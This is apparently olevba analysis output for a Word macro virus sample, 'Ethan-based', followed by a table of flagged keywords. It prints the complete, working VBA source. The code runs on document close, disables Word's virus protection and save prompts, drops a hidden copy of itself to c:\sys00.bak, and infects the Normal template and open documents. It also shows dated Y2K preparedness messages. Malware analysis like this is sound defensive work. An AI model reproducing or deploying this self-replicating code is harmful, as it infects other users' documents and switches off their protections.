olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-57ca55365890ba69de9e3635365482dd1490c2e8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-57ca55365890ba69de9e3635365482dd1490c2e8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'y2k
' Open Letter to the Virus Hunters
'
' This virus was written to help educate the
' public about the dangers of the approaching
' millennium bug. Please do not update your
' virus scanners to detect or clean this virus
' until after December 1, 1999.
'
' I know you won't do that, but what the heck.
'
' I tried.
'
' Bye!
'
On Error Resume Next

s = ActiveDocument.Saved

Application.EnableCancelKey = Not -1

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

Randomize

If Dir("c:\sys00.bak", 6) = "" Then
   Open "c:\sys00.bak" For Output As #1
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
      a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
      Print #1, a
      Next i
   Close #1
   SetAttr "c:\sys00.bak", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
   Set tf = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
   Set tf = ActiveDocument.VBProject.VBComponents.Item(1)
Else
   tf = ""
End If

If tf <> "" Then
   Open "c:\sys00.bak" For Input As #1
   If LOF(1) = 0 Then GoTo q
   i = 1
   Do While Not EOF(1)
      Line Input #1, a
      tf.CodeModule.InsertLines i, a
      i = i + 1
   Loop
q:
   Close #1
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End If

dd = Day(Now): mm = Month(Now): yy = Year(Now)
hh = Hour(Now): mm = Minute(Now): ss = Second(Now)

' only display messages for 1999
If yy <> 1999 Then
   GoTo end_here
End If

' only display messages until after lunch
If hh > 16 Then
   GoTo end_here
End If

t$ = Chr(13) + Chr(13)

'april 1, 1999
If dd = 1 And mm = 4 Then
   Title$ = "Y2K! Spread the word"
   msg$ = "This is not an April fools joke. I wish it were! The year 2000 is fast approaching, and the word still needs to be spread about the implications and dangers of the millennium bug commonly referred to as the Y2K bug. The virus that has infected this word document was written to help spread the word about the Y2K bug, and educate you so you can prepare yourself and your family for Saturday January 1, 2000."
   msg$ = msg$ + t$ + "From today until January 1, 2000, on the first business day of each month, I will give you a lesson in Y2K preparation."
   msg$ = msg$ + t$ + "Spread the word. Knowledge is power!"
   MsgBox msg$, vbCritical, Title$
End If

'May 3, 1999
If dd = 3 And mm = 5 Then
   Title$ = "Hello again!"
   msg$ = "Lets start our first lesson to help prepare you for the millennium bug. Although I don't personally believe there will be food shortages, power shortages, gas shortages as a result of a computer bug, there will be food, power and gas shortages by hoarding nitwits that fear the millennium bug. As a result, I highly recommend that you begin to stockpile bottled water (1-month supply), canned food (1-month supply), and as much gas as you can store (keep your vehicle gas tank always topped up starting December 1st)."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'June 1, 1999
If dd = 1 And mm = 6 Then
   Title$ = "How's the weather?"
   msg$ = "Right now it's pretty warm out, so you are probably not thinking much about the winter. But remember the millennium bug is expected to hit in the middle of winter. If you're in a northern climate, like the Great White North (Canada), I suggest you consider purchasing a good airtight wood stove, and at least a face cord of wood. Even if there are no disruptions in natural gas, or oil, or electricity, the wood stove is a great way of reducing your heating bills. And if there is a problem, you will be comfortable in your own heated home, unlike your unprepared neighbors (remember the Canadian ice storm last year!)"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'July 2, 1999
If dd = 2 And mm = 7 Then
   Title$ = "Did you get the stove?"
   msg$ = "Last month I recommend purchasing a gas stove to help heat your home in the event that your supply of electricity, gas, or oil was interrupted. This month I would like to suggest that you purchase a portable generator and enough gas cans to store gas to power the generator. The generator can be used to power lighting and small electrical appliances should the power be disrupted."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'August 2, 1999
If dd = 2 And mm = 8 Then
   Title$ = "Getting back to basics"
   msg$ = "In this installment, I would like to suggest that you consider purchasing candles, matches, flashlights, and batteries. These items will be invaluable during those cold, dark nights should the power companies fail in their Y2K conversion. Don't plan on relying on the banks or credit/debit cards. Start each month, and stash away enough money to last you at least 2 months. This money should include enough money to pay the rent/mortgage, utilities, FOOD, etc. Remember cold hard cash is accept EVERYWHERE."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'September 1, 1999
If dd = 1 And mm = 9 Then
   Title$ = "A Limerick"
   msg$ = "The millennium 's not far away"
   msg$ = msg$ + Chr(13) + "Get onto your coding today"
   msg$ = msg$ + Chr(13) + "Fix it or fudge it"
   msg$ = msg$ + Chr(13) + "The boss won't begrudge it"
   msg$ = msg$ + Chr(13) + "If everything works on the day!"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'October 1, 1999
If dd = 1 And mm = 10 Then
   Title$ = "Three months to go"
   msg$ = "Getting nervous? If you've followed my advice over the past months, there should be nothing for you to worry about. We will survive the Y2K bug, but preparation will insure that if there is any Y2K crisis, it will only be small bump on the road, not a major pothole for you."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'November 1, 1999
If dd = 1 And mm = 11 Then
   Title$ = "Two months to go"
   msg$ = "Personally, I don't believe that there will be a major, global Y2K crisis. I trust the banks with my money, I trust MOST of the industrial sector, and I trust the power and water agencies to provide me with power and water over the ""infamous"" weekend. I even trust the Russians and there nuclear arms! BUT you can never be too careful. Take care. Be prepared. Use common sense."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'December 1, 1999
If dd = 1 And mm = 12 Then
   Title$ = "Good Luck (30 days to go)"
   msg$ = "Well, this will be the final installment in the Y2K preparation lessons. If you have followed my advice over the past few months, you will be in excellent shape to bring in the New Year. May the New Year bring you health and happiness. Best wishes."
   msg$ = msg$ + t$ + "Bye!"
   MsgBox msg$, vbCritical, Title$
End If

end_here:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

